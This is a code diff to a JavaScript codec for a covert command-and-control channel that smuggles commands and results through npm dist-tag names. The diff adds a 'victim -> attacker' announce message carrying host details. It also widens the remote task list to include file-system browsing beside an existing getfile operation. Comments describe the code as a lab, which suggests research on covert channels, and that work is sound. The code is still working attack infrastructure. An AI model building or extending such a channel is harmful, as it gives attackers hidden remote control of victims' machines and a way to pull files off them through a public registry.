@@ -1,8 +1,9 @@
 // Protocol codec for the dist-tag C2 channel.
 //
 // Tag grammar (see docs/protocol.md):
-//   command: x-cmd-<agentId>-<seq>-<base64url(JSON)>
-//   result:  x-res-<agentId>-<seq>-<chunk>of<total>-<base64url(JSON-chunk)>
+//   command:  x-cmd-<agentId>-<seq>-<base64url(JSON)>
+//   result:   x-res-<agentId>-<seq>-<chunk>of<total>-<base64url(JSON-chunk)>
+//   announce: x-ann-<agentId>-<base64url(JSON)>   (victim -> attacker hello)
 //
 // - Every tag value is pinned to PINNED_VERSION (dist-tag values must be real,
 //   existing versions, so all payload data lives in the tag NAME).
@@ -18,13 +19,26 @@ export const PINNED_VERSION = '1.0.0';
 export const SENTINEL = 'x-';
 export const MAX_TAG_LEN = 214;
 export const BROADCAST_ID = 'all';
-export const TASK_OPS = ['echo', 'sysinfo', 'ping', 'time', 'whoami', 'getfile'];
+export const TASK_OPS = [
+  'echo',
+  'sysinfo',
+  'ping',
+  'time',
+  'whoami',
+  'getfile',
+  'pwd',
+  'cd',
+  'ls',
+  'stat',
+  'hash',
+];
 
 const AGENT_ID_RE = /^[A-Za-z0-9_]{1,64}$/;
 const B64URL_RE = /^[A-Za-z0-9_-]+$/;
 const CHUNK_SPEC_RE = /^(\d+)of(\d+)$/;
 const CMD_PREFIX = 'x-cmd-';
 const RES_PREFIX = 'x-res-';
+const ANN_PREFIX = 'x-ann-';
 
 export class ProtocolError extends Error {
   constructor(message) {
@@ -254,10 +268,59 @@ export function reassembleResult(parts) {
 }
 
 // ---------------------------------------------------------------------------
+// announce tags (victim -> attacker hello, published once at startup)
+// ---------------------------------------------------------------------------
+
+/**
+ * Encode a startup announce into a single dist-tag name.
+ * @param {string} agentId
+ * @param {object} payload e.g. { ts: 123, cwd: '/tmp', host: 'vm1' }
+ * @returns {string} tag name
+ */
+export function encodeAnnounceTag(agentId, payload) {
+  validateAgentId(agentId);
+  const name = `${ANN_PREFIX}${agentId}-${encodePayload(payload)}`;
+  assertValidTagName(name);
+  return name;
+}
+
+export function isAnnounceTag(name) {
+  return typeof name === 'string' && name.startsWith(ANN_PREFIX);
+}
+
+/**
+ * Decode an announce tag name.
+ * @returns {{agentId: string, payload: object}}
+ * @throws {ProtocolError} on malformed tags
+ */
+export function decodeAnnounceTag(name) {
+  if (!isAnnounceTag(name)) {
+    throw new ProtocolError(`not an announce tag: "${name}"`);
+  }
+  const parts = name.split('-');
+  // x, ann, agentId, ...payload (payload may itself contain '-')
+  if (parts.length < 4) {
+    throw new ProtocolError(`malformed announce tag (too few fields): "${name}"`);
+  }
+  const agentId = parts[2];
+  const b64 = parts.slice(3).join('-');
+  try {
+    validateAgentId(agentId);
+  } catch {
+    throw new ProtocolError(`malformed announce tag (bad agentId): "${name}"`);
+  }
+  const payload = decodePayload(b64);
+  if (typeof payload !== 'object' || payload === null) {
+    throw new ProtocolError(`announce payload is not an object: "${name}"`);
+  }
+  return { agentId, payload };
+}
+
+// ---------------------------------------------------------------------------
 // misc
 // ---------------------------------------------------------------------------
 
 /** Any tag belonging to this lab (used by `clean`). */
 export function isLabTag(name) {
-  return isCommandTag(name) || isResultTag(name);
+  return isCommandTag(name) || isResultTag(name) || isAnnounceTag(name);
 }
